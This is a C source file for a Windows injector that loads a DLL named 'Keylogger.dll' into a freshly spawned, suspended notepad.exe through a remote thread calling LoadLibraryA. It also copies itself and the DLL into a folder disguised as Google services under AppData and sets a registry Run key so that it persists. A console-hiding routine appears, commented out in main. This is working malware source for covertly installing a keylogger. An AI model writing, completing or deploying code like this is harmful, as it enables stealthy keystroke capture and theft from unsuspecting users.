#include "injector.h"

BOOL create_suspended_process(LPCSTR targetPath, PROCESS_INFORMATION *ProcessInfo) {
    STARTUPINFOA StartInfo = { sizeof(STARTUPINFOA) };
    return CreateProcessA(targetPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &StartInfo, ProcessInfo);
}

HMODULE get_kernel32_handle() {
    return GetModuleHandleA("kernel32.dll");
}

FARPROC get_loadlibrary_address(HMODULE kernel32Handle) {
    return GetProcAddress(kernel32Handle, "LoadLibraryA");
}

LPVOID allocate_memory(HANDLE hProcess, LPCSTR libraryPath) {
    return VirtualAllocEx(hProcess, NULL, strlen(libraryPath) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
}

BOOL write_memory(HANDLE hProcess, LPVOID remoteMemory, LPCSTR libraryPath) {
    return WriteProcessMemory(hProcess, remoteMemory, libraryPath, strlen(libraryPath) + 1, NULL);
}

BOOL create_remote_thread(HANDLE hProcess, LPVOID remoteMemory, FARPROC loadLibraryAddr) {
    HANDLE remoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddr, remoteMemory, 0, NULL);
    if (remoteThread) {
        WaitForSingleObject(remoteThread, INFINITE);
        CloseHandle(remoteThread);
        return TRUE;
    }
    return FALSE;
}

void cleanup(PROCESS_INFORMATION *ProcessInfo) {
    ResumeThread(ProcessInfo->hThread);
    CloseHandle(ProcessInfo->hThread);
    CloseHandle(ProcessInfo->hProcess);
}

void create_directory(char *targetPath) {
    if (!targetPath) return;
    
    struct stat st = {0};
    if (stat(targetPath, &st) == -1) {
        if (_mkdir(targetPath) == 0) {
            printf("Directory created successfully: %s\n", targetPath);
        } else {
            perror("Failed to create directory");
        }
    } else {
        printf("Directory already exists: %s\n", targetPath);
    }
}

void copyToSystemLocation(char *targetPath) {
    if (!targetPath) return;
    
    char username[256];
    DWORD username_len = sizeof(username);

    if (!GetUserName(username, &username_len)) {
        printf("Failed to get username. Error code: %lu\n", GetLastError());
        return;
    }
   
    if (snprintf(targetPath, MAX_PATH, "C:\\Users\\%s\\AppData\\Local\\Google\\Services", username) >= MAX_PATH) {
        printf("Path length exceeds MAX_PATH limit.\n");
        return;
    }

    create_directory(targetPath);

    if (snprintf(targetPath, MAX_PATH, "C:\\Users\\%s\\AppData\\Local\\Google\\Services\\%s", username, NEWFILE) >= MAX_PATH) {
        printf("Path length exceeds MAX_PATH limit.\n");
        return;
    }

    if (access(targetPath, F_OK) != -1) {
        printf("File already exists at target location: %s\n", targetPath);
    } else if (!CopyFile(OLDFILE, targetPath, FALSE)) {
        printf("Error copying file. Error code: %lu\n", GetLastError());
    } else {
        printf("File copied successfully to: %s\n", targetPath);
    }

    if (snprintf(targetPath, MAX_PATH, "C:\\Users\\%s\\AppData\\Local\\Google\\Services\\%s", username, NEWDLL) >= MAX_PATH) {
        printf("Path length exceeds MAX_PATH limit.\n");
        return;
    }

    if (access(targetPath, F_OK) != -1) {
        printf("DLL already exists at target location: %s\n", targetPath);
    } else if (!CopyFile(OLDDLL, targetPath, FALSE)) {
        printf("Error copying DLL. Error code: %lu\n", GetLastError());
    } else {
        printf("DLL copied successfully to: %s\n", targetPath);
    }
}

void setRegistryPersistence(const char *targetPath) {
    if (!targetPath) return;
    
    HKEY hKey;
    LONG result = RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
    if (result == ERROR_SUCCESS) {
        RegSetValueEx(hKey, REGISTERY_NAME, 0, REG_SZ, (LPBYTE)targetPath, (DWORD)(strlen(targetPath) + 1));
        RegCloseKey(hKey);
        printf("Registry persistence set for: %s\n", targetPath);
    } else {
        printf("Failed to open registry key. Error code: %lu\n", GetLastError());
    }
}

void persistence() {
    char targetPath[MAX_PATH];
    copyToSystemLocation(targetPath); 
    setRegistryPersistence(targetPath); 
}

void hideConsole() {
    HWND stealth = GetConsoleWindow();
    ShowWindow(stealth, SW_HIDE);
}


int main() {

    // hideConsole();
    persistence();

    PROCESS_INFORMATION ProcessInfo = { 0 };
    LPCSTR targetPath = "C:\\Windows\\System32\\notepad.exe";
    LPCSTR libraryPath = "Keylogger.dll";

    if (!create_suspended_process(targetPath, &ProcessInfo)) {
        printf("Failed to create process!\n");
        return 1;
    }

    HMODULE kernel32Handle = get_kernel32_handle();
    if (!kernel32Handle) {
        printf("Error retrieving kernel32 handle.\n");
        return 1;
    }

    FARPROC loadLibraryAddr = get_loadlibrary_address(kernel32Handle);
    if (!loadLibraryAddr) {
        printf("Failed to locate LoadLibraryA.\n");
        return 1;
    }

    LPVOID remoteMemory = allocate_memory(ProcessInfo.hProcess, libraryPath);
    if (!remoteMemory) {
        printf("Could not allocate memory in target process.\n");
        return 1;
    }

    if (!write_memory(ProcessInfo.hProcess, remoteMemory, libraryPath)) {
        printf("Failed to write to process memory.\n");
        return 1;
    }

    if (!create_remote_thread(ProcessInfo.hProcess, remoteMemory, loadLibraryAddr)) {
        printf("Could not create remote thread.\n");
        return 1;
    }

    cleanup(&ProcessInfo);

    printf("DLL injected successfully.\n");
    return 0;
}